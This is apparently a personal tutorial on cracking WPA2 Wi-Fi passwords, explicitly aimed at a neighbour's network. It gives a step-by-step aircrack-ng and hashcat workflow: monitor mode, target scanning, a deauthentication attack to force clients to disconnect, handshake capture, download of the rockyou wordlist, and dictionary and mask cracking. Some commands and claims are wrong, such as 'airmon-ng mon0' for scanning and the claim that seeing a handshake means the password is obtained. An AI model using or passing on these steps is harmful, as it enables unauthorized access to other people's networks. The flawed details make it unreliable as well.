# How to hack wifi with weak password

This document will talk about how to hack your nerberhood wifi(weak password) 

# Find Your Target

Listen to [802.11 Beacon frame](https://en.wikipedia.org/wiki/Beacon_frame) broadcat near by wireless routers.

check if you device support monitor mode

```bash
airmon-ng
```

if there's nothing listed, your wireless card does not support monitor mode

using follow command to start monitor mode

```bash
airmon-ng start wlan0
```

`wlan0` is the device that listd by `airmon-ng`

using follow command to find your target

```bash
airmon-ng mon0 # run `iwconfig` to see new monitor interface
```

```
 CH  4 ][ Elapsed: 6 s ][ 2025-07-30 07:56 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 80:E4:55:87:3C:AC  -66        1        1    0   6  270   WPA2 CCMP   PSK  H3C_87
 3C:67:FD:8A:85:9A  -55        3        0    0   9  180   WPA2 CCMP   PSK  XY899902 
 06:F9:F8:59:14:28  -58       20        0    0   6  360   WPA2 CCMP   PSK  <length:  0>
 80:E4:55:87:3C:AA  -67       25        0    0   6  130   OPN              <length:  0>
 AE:97:CC:FC:D2:0E  -53        7        0    0   1  360   WPA2 CCMP   PSK  <length:  0>
```

- `BSSID` routers MAC address

- `PWR` is singal strength ,close to 0 is better

- `Beacon` is commucation frame between computer and routers

- `Data` data packages the more data the more frequently commucate

- `#/s` data packages per seconde

- `CH` channel 1,6,12 is the frequently 2.4GHz singal channel

- `ENC` encryption

- `CIPHER` encrypte algorithm  `TKIP` Temporal Key Integrity Protocol `CCMP` AES encryption `WEP` Wired Equivalent Privacy

- `AUTH` Authentication method `PSK` for fimally `MGT` for enterprise and `OPN` open access

- `ESSID` Extended Service Set Identifier(Wifi name)

# Capture a 4-way Handshake

## Process of WPA Handshake

```
client <-----> Access Point(AP)
   |              |
   |    1. ANonce |
   |<-------------|  AP Send random number
   |              |
   | 2. SNonce +  |
   |    MIC       |
   |------------->|  Client responds with authentication verification
   |              |
   |  3. GTK +    |
   |     MIC      |
   |<-------------|  AP sends Group Temporal Key (GTK)
   |              |
   |   4. ACK     |
   |------------->|  Handshake completion confirmation
```
## monitor wifi message

```bash
# replace -c and --bssid values with the values of your target network
# -w specifies the directory where we will save the packet capture
airodump-ng -c 3 --bssid 9C:5C:8E:C9:AB:C0 -w . mon0
```

```
 CH  6 ][ Elapsed: 1 min ][ 2017-07-23 16:09 ]                                        
                                                                                                                                              
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                              
 9C:5C:8E:C9:AB:C0  -47   0      140        0    0   6  54e  WPA2 CCMP   PSK  ASUS
```

> [!NOTE]
> now either wait for clinet Handshake or using [Deauth Attack](##deauth-attack) force disconnect cilent

## Deauth Attack

```bash
# Force disconnect cilent device so that we can get authentication verification
# which contained password
aireplay-ng -0 5 -a [AP_MAC] -c [CLIENT_MAC] -w [OUTPUT_FILE_NAME] wlan0mon
```

while you get Handshake data you will see

```
 CH  6 ][ Elapsed: 1 min ][ 2017-07-23 16:09 ][ WPA handshake: bc:d3:c9:ef:d2:67
```

`[ WPA handshake: bc:d3:c9:ef:d2:67` this mean that you have get the password

you can see the monitor file `OUTPUT_FILE_NAME.cap`

using hcxpcapngtool convert captured file

```bash
hcxpcapngtool -o OUTPUT_FILE_NAME.hc22000 -E wordlist OUTPUT_FILE_NAME.cap
```

- `-E` wordlist possiable password


```bash
# download the 134MB rockyou dictionary file
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
```

Note, that if the network password is not in the wordfile you will not crack the password

```bash
hashcat -m 22000 OUTPUT_FILE_NAME.hc22000 rockyou.txt
```

or gass the password and force try it

```bash
hashcat -m 22000 511.hc22000 -a 3 ?l?l?l?l?d?d?d?d
```

`-a 3`

- Attack mode
- 3 Mask deauth-attack

Mask Character Sets

| Mask | Character | Range |
|------|-----------|-------|
| ?l | Lowercase | a-z |
| ?u | Uppercase | A-Z |
| ?d | Digits | 0-9 |
| ?h | Hex lowercase | 0-9a-f |
| ?H | Hex uppercase | 0-9A-F |
| ?s | Special chars | !"#$%&'()*+,-./:;<=>?@[]^_`{ |
| ?a | All printable | ?l?u?d?s |
